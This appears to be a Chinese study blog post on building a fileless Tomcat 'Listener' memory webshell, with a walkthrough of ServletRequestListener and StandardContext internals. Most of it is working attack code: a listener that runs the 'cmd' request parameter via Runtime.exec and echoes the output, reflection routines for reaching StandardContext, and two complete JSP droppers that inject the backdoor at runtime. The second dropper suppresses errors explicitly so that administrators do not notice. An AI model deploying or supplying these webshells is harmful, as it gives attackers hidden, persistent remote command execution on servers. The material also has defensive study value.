# Listener
Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。
## Listener三个域对象
- ServletContextListener
- HttpSessionListener
- ServletRequestListener

很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法。下面我们来实现一个恶意的 Listener

# 恶意Listener构造
要实现一个 Listener 必须实现 EventListener 接口
![](picture/Pasted%20image%2020260105231709.png)
很多接口继承了EventListener，那么如果我们需要实现内存马的话就需要找一个每个请求都会触发的 Listener
我们去寻找的时候一定是优先找 **Servlet** 开头的类
这里我找到了 ServletRequestListener ，因为根据名字以及其中的 requestInitialized 方法感觉我们的发送的每个请求都会触发这个监控器

有了猜想之后就可以先开始实践了，编写一个简单的 demo 来进行测试
写一个Listener
```java
package demo.tomcat;  
  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
  
public class SerVlertListener implements ServletRequestListener {  
    public SerVlertListener() {  
        super();  
    }  
  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
  
    }  
  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        System.out.println("requestInitialized!");  
  
    }  
}
```
在web.xml里把我们的Linstener注册进去
```xml
<listener>  
    <listener-class>demo.tomcat.SerVlertListener</listener-class>  
</listener>
```
# 流程分析
- 流程分析的意义是让我们能够正确的写入恶意的内存马，具体要解决的其实有以下两个问题：

1、 我们的恶意代码应该在哪儿编写？  
2、 Tomcat 中的 Listener 是如何实现注册的？

## 恶意代码在哪写？
第一个问题现在我们已经想到一种显而易见的方法
写在刚刚的`requestInitialized()`里
```java
    public void requestInitialized(ServletRequestEvent sre) {  
        System.out.println("requestInitialized!");  
  
    }  
```
在 Listener 这里提供了 ServletRequestEvent 类型的参数，从名字可推测出为 Servlet请求事件

我们思考
- 用户发送 `?cmd=ls` 给服务器。
- Tomcat 接收到请求，心想：“有个请求进来了，我得通知监听器。”
- Tomcat 把这个请求打包成一个 `ServletRequestEvent` (即 `sre`)，然后调用`requestInitialized(sre)`。

那我们想办法把请求的对象从 `ServletRequestEvent sre`这个传入的参数中拿出来，然后在`requestInitialized()`种写入我们的木马，传入我们刚刚拿的对象，这样就可以执行命令，并且有回显了。

ok我们先解决第一步，拿到我们传入的get参数或者post传参。所以我们需要寻找 sre 的一个方法来获取到请求对象。

通过IDEA的自动补全功能可以帮我们找到`getServletRequest`（感觉这个技巧还挺巧，学到了）
![](picture/Pasted%20image%2020260105235208.png)
当然，源码也很简单，直接看都一样。
可以看到该方法返回的是 ServletRequest 接口的实现类，那么具体是哪个实现类呢，我们直接调试一下就知道了
![](picture/Pasted%20image%2020260105235335.png)

```java
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String name = sre.getServletRequest().getClass().getName();
        System.out.println(name);
        System.out.println("requestInitialized");
    }
```
这样就行了
![](picture/Pasted%20image%2020260105235647.png)
`org.apache.catalina.connector.RequestFacade`可以看到是这个类，我们去看看
ok这里的request是 Request类的我们去看看
![](picture/Pasted%20image%2020260105235956.png)
在这里我们可以看到，这里就是包含我们请求也就是 `Request+Response`
![](picture/Pasted%20image%2020260106000817.png)

ok，那我们直接反射获取 `RequestFacade`的那个request属性，就能拿到存放我们请求和回复的对象 Response了。

```java
package demo.tomcat;  
  
import javax.servlet.ServletRequest;  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
import java.io.InputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
  
public class SerVlertListener implements ServletRequestListener {  
    public SerVlertListener() {  
        super();  
    }  
  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
  
    }  
  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        String cmd = sre.getServletRequest().getParameter("cmd");//拿到传参  
        ServletRequest requestfacade = sre.getServletRequest();//拿到requestfacade类  
        try {  
            Field requestField = requestfacade.getClass().getDeclaredField("request");  
            requestField.setAccessible(true);  
            Object ObjectRequest = requestField.get(requestfacade);//拿到存放请求内容的对象  
  
            Method getResponseMethod = ObjectRequest.getClass().getMethod("getResponse");//拿其中的回复对象，为了回显  
            Object ObjectResponse = getResponseMethod.invoke(ObjectRequest);  
            //再获取ObjectResponse的 Writer 以便写出数据  
            java.io.PrintWriter writer = (java.io.PrintWriter) ObjectResponse.getClass().getMethod("getWriter").invoke(ObjectResponse);  
            //命令执行  
            if (cmd != null) {  
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
                java.util.Scanner s = new java.util.Scanner(inputStream).useDelimiter("\\A");  
                String output = s.hasNext() ? s.next() : "";  
                // 6. 使用我们“偷”出来的 writer 将结果写回浏览器  
                writer.write(output);  
                writer.flush();  
            }  
  
        } catch (Exception e) {  
            throw new RuntimeException(e);  
        }  
  
    }  
}
```
![](picture/Pasted%20image%2020260106004603.png)
呼~完美。
## Tomcat 中的 Listener 是如何实现注册的？
这里我们想办法找Listener注册的流程，
我们在我们自己的listener中打一个断点，看看调用栈
![](picture/Pasted%20image%2020260106204605.png)
```
fireRequestInitEvent:5982, StandardContext (org.apache.catalina.core)
```
看到这个东西后调用了我们自己的listener
进去看看这个方法，看到了很多有意思的东西
```java
@Override  
public boolean fireRequestInitEvent(ServletRequest request) {  
  
    Object instances[] = getApplicationEventListeners();//去除Listeners对象  
  
    if ((instances != null) && (instances.length > 0)) {  
  
        ServletRequestEvent event =  
                new ServletRequestEvent(getServletContext(), request); //创建请求对象 
		//遍历Listner对象并且初始化....  
        for (Object instance : instances) {  
            if (instance == null) {  
                continue;  
            }  
            if (!(instance instanceof ServletRequestListener)) {  
                continue;  
            }  
            ServletRequestListener listener = (ServletRequestListener) instance;  
  
            try {  
                listener.requestInitialized(event);  
            } catch (Throwable t) {  
                ExceptionUtils.handleThrowable(t);  
                getLogger().error(sm.getString(  
                        "standardContext.requestListener.requestInit",  
                        instance.getClass().getName()), t);  
                request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);  
                return false;  
            }  
        }  
    }  
    return true;  
}
```
完美，我们看到了我们想要的东西，可以看到，他先把 Listeners对象实例取出来放到数组，创建请求对象，然后遍历每个对象，进行安全检查之后执行每一个listener的 `requestInitialized()`进行初始化
那我们就看看 `getApplicationEventListeners()`怎么个事呗。
我们发现，我们的Listener应该是存储在 `applicationEventListenersList`里的
![](picture/Pasted%20image%2020260106205655.png)
查找调用，可以看到两个有意思的方法
我们猜测一个是初始set我们的Listener的方法，一个是可以调用然后添加Listener的方法
![](picture/Pasted%20image%2020260106205907.png)
那问题就迎刃而解了，我们之前在filter已经拿到StandardContext类了，通过 `addApplicationEventListener()`可以把我们的Listener对象塞进去

1. 在jsp或者Servlet环境中，用`ServletContext`来获取
```java
ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类 
  
  //通过反射访问私有属性context，拿到了ApplicationContext
 Field appctx = servletContext.getClass().getDeclaredField("context"); 
 appctx.setAccessible(true);  
 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
  //再次反射拿StandardContext
 Field stdctx = applicationContext.getClass().getDeclaredField("context");  
 stdctx.setAccessible(true);  
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
```
2. 使用我们恶意listener中获取到的 `RequestFacade`中真正的 `Request`对象，调用其 `getContext()`来获取StandardContext
```java
// 1. 拿到 RequestFacade (sre.getServletRequest() 返回的就是它)
ServletRequest requestfacade = sre.getServletRequest();

try {
    // 2. 反射获取 RequestFacade 里的底层 Request 对象
    Field requestField = requestfacade.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    Object connectorRequest = requestField.get(requestfacade);

    // 3. 调用 getContext() 方法。在 Tomcat 中，这个方法返回的就是 StandardContext 的实例
    Method getContextMethod = connectorRequest.getClass().getMethod("getContext");
    Object standardContext = getContextMethod.invoke(connectorRequest);
    
} catch (Exception e) {
    e.printStackTrace();
}
```
3. 当无法获取request的时候，用线程上下文ClassLoader获取
```java
try {
    // 1. 获取当前线程的类加载器
    // Tomcat 为每个 Web 应用分配了一个独立的 WebappClassLoader
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

    // 2. 在 Tomcat 8/9 中，这个 ClassLoader 内部有一个 resources 属性
    Field resourcesField = classLoader.getClass().getDeclaredField("resources");
    resourcesField.setAccessible(true);
    Object resources = resourcesField.get(classLoader);

    // 3. WebResourceRoot 接口有一个 getContext() 方法，返回 StandardContext
    Method getContextMethod = resources.getClass().getMethod("getContext");
    Object standardContext = getContextMethod.invoke(resources);

} catch (Exception e) {
    e.printStackTrace();
}
```

---

ok最终调用 `standardContext`的 `addApplicationEventListener()`添加我们自己的listener

```jsp
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="java.lang.reflect.Method" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="org.apache.catalina.core.StandardContext" %><%--  
  Created by IntelliJ IDEA.  User: point  Date: 2026/1/6  Time: 21:29  To change this template use File | Settings | File Templates.--%>  
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<%! class ListenerShell implements ServletRequestListener{  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
  
    }  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        String cmd = sre.getServletRequest().getParameter("cmd");//拿到传参  
        ServletRequest requestfacade = sre.getServletRequest();//拿到requestfacade类  
        try {  
            Field requestField = requestfacade.getClass().getDeclaredField("request");  
            requestField.setAccessible(true);  
            Object ObjectRequest = requestField.get(requestfacade);//拿到存放请求内容的对象  
  
            Method getResponseMethod = ObjectRequest.getClass().getMethod("getResponse");//拿其中的回复对象，为了回显  
            Object ObjectResponse = getResponseMethod.invoke(ObjectRequest);  
            //再获取ObjectResponse的 Writer 以便写出数据  
            java.io.PrintWriter writer = (java.io.PrintWriter) ObjectResponse.getClass().getMethod("getWriter").invoke(ObjectResponse);  
            //命令执行  
            if (cmd != null) {  
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
                java.util.Scanner s = new java.util.Scanner(inputStream).useDelimiter("\\A");  
                String output = s.hasNext() ? s.next() : "";  
  
                // 6. 使用我们“偷”出来的 writer 将结果写回浏览器  
                writer.write(output);  
                writer.flush();            }  
        } catch (Exception e) {  
            throw new RuntimeException(e);  
        }    }}  
%>  
<%  
    ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类  
  
    //通过反射访问私有属性context，拿到了ApplicationContext  
    Field appctx = servletContext.getClass().getDeclaredField("context");  
    appctx.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
    //再次反射拿StandardContext  
    Field stdctx = applicationContext.getClass().getDeclaredField("context");  
    stdctx.setAccessible(true);  
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
    ListenerShell listenerShell = new ListenerShell();  
    standardContext.addApplicationEventListener(listenerShell);%>
```



```jsp
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="java.lang.reflect.Method" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="java.util.Scanner" %><%--  
  Created by IntelliJ IDEA.  User: point  Date: 2026/1/6  Time: 21:29  To change this template use File | Settings | File Templates.--%>  
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<%! class ListenerShell implements ServletRequestListener{  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
  
    }  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();        String cmd = request.getParameter("cmd");  
  
        if (cmd != null && !cmd.isEmpty()) {  
            try {  
                // 1. 判定操作系统逻辑 [引用第一个代码片段的逻辑]  
                String osTyp = System.getProperty("os.name");  
                boolean isLinux = true;  
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
                    isLinux = false;  
                }  
                // 根据 OS 构造命令数组，确保管道符、重定向等能正常工作  
                String[] cmds = isLinux ?  
                        new String[]{"/bin/sh", "-c", cmd} :  
                        new String[]{"cmd.exe", "/c", cmd};  
  
                // 2. 执行命令  
                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();  
                Scanner s = new Scanner(inputStream).useDelimiter("\\A");  
                String output = s.hasNext() ? s.next() : "";  
  
                // 3. 反射获取 Response 对象实现回显  
                // 拿到 RequestFacade 内部的 Request 对象  
                Field requestField = request.getClass().getDeclaredField("request");  
                requestField.setAccessible(true);  
                Object connectorRequest = requestField.get(request);  
                // 调用 getContext() 并通过它拿到 Response (Tomcat 底层 Request 有 getResponse 方法)  
                Method getResponseMethod = connectorRequest.getClass().getMethod("getResponse");  
                Object connectorResponse = getResponseMethod.invoke(connectorRequest);  
                // 获取 Writer 并输出结果  
                java.io.PrintWriter writer = (java.io.PrintWriter) connectorResponse.getClass().getMethod("getWriter").invoke(connectorResponse);  
                writer.write(output);                writer.write("\r\n"); // 换行增加可读性  
                writer.flush();  
  
            } catch (Exception e) {  
                // 静默处理或简单记录，避免抛出异常被管理员发现  
            }  
        }    }}  
%>  
<%  
    ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类  
  
    //通过反射访问私有属性context，拿到了ApplicationContext  
    Field appctx = servletContext.getClass().getDeclaredField("context");  
    appctx.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
    //再次反射拿StandardContext  
    Field stdctx = applicationContext.getClass().getDeclaredField("context");  
    stdctx.setAccessible(true);  
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
    ListenerShell listenerShell = new ListenerShell();  
    standardContext.addApplicationEventListener(listenerShell);%>
```

![](picture/Pasted%20image%2020260106214431.png)



[Tomcat 内存马（二）：Listener 内存马 – 天下大木头](https://wjlshare.com/archives/1651)
[Java内存马系列-05-Tomcat 之 Servlet 型内存马 | Drunkbaby's Blog](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)
[Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)
